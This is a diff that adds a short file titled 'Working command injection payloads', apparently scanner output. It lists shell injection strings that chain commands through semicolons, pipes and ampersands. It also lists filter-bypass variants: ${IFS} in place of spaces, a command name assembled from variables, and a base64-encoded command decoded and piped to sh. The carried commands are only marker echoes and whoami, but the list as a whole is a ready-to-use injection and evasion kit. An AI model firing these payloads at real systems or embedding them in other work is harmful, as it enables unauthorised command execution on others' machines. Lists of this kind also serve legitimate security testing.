@@ -1,0 +1,24 @@
+WORKING COMMAND INJECTION PAYLOADS
+======================================================================
+
+[semicolon]
+  ; echo CMDI_TEST_MARKER
+
+[pipe]
+  | echo CMDI_TEST_MARKER
+
+[or]
+  || echo CMDI_TEST_MARKER
+
+[background]
+  & echo CMDI_TEST_MARKER
+
+[bypass_space_ifs]
+  ;${IFS}echo${IFS}CMDI_BYPASS_OK
+
+[bypass_cmd_concat_var]
+  ; a=who;b=ami;$a$b
+
+[bypass_cmd_base64_decode]
+  ; echo d2hvYW1p | base64 -d | sh
+
